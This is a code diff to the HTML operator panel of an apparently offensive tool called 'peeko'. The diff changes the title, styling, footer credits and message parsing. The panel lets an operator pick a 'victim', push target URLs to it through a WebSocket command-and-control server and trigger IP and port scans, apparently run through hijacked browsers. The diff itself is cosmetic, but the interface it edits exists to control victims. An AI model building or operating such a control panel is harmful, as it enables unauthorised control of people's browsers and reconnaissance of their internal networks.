@@ -2,13 +2,24 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Control Panel</title>
+  <title>peeko</title>
   <style>
     body {
       font-family: sans-serif;
       padding: 20px;
       background-color: #f9f9f9;
       color: #222;
+    }
+    h1 {
+      font-size: 28px;
+      text-align: center;
+      margin-bottom: 5px;
+    }
+    h1 + p {
+      text-align: center;
+      font-size: 14px;
+      color: #666;
+      margin-top: 0;
     }
     #response {
       background: #fff;
@@ -37,9 +48,18 @@
       cursor: pointer;
       margin-right: 5px;
     }
+    footer {
+      margin-top: 40px;
+      font-size: 13px;
+      color: #888;
+      text-align: center;
+    }
   </style>
 </head>
 <body>
+
+  <h1>peeko</h1>
+  <p>v1.0</p>
 
   <div class="section">
     <label for="victimSelect">🧍 Select Victim:</label><br>
@@ -50,7 +70,7 @@
 
   <div class="section">
     <label for="url">🎯 Target URL:</label><br>
-    <input id="url" placeholder="https://192.168.1.124:8080/b3rito.html" size="60">
+    <input id="url" placeholder="https://192.168.1.124:8080/example.html" size="60">
     <button onclick="send()">Send</button>
   </div>
 
@@ -67,11 +87,15 @@
     <label>📡 Log Output</label>
     <div>
       <button onclick="copyLog()">📋 Copy</button>
-      <button onclick="saveLog('txt')">Save .txt</button>
-      <button onclick="saveLog('json')">Save .json</button>
+      <button onclick="saveLog('txt')">💾 Save .txt</button>
+      <button onclick="saveLog('json')">💾 Save .json</button>
     </div>
     <pre id="response"></pre>
   </div>
+
+  <footer>
+    peeko v1.0 – by b3rito & GioPpeTto
+  </footer>
 
   <script>
     const socket = new WebSocket("wss://SERVER-IP:8443/ws");
@@ -86,7 +110,7 @@
 
     socket.onmessage = event => {
       const msg = event.data;
-      const cleanMsg = msg.replace(/^\[victim-\d+\]\s*/, "");
+      const cleanMsg = msg.includes("]") ? msg.split("] ").slice(1).join("] ") : msg;
       const interesting = ["[✅]", "[📄]", "[🟢]", "[🔴]"];
 
       if (interesting.some(prefix => cleanMsg.startsWith(prefix))) {
@@ -111,13 +135,13 @@
     function send() {
       const victim = getSelectedVictim();
       const url = document.querySelector("#url").value;
-      if (!victim) return alert("Select a victim first.");
+      if (!victim) return alert("⚠️ Select a victim first.");
       socket.send(`to:${victim}|${url}`);
     }
 
     function scan() {
       const victim = getSelectedVictim();
-      if (!victim) return alert("Select a victim first.");
+      if (!victim) return alert("⚠️ Select a victim first.");
 
       const ipInput = document.querySelector("#iprange").value.trim();
       const portInput = document.querySelector("#ports").value.trim();
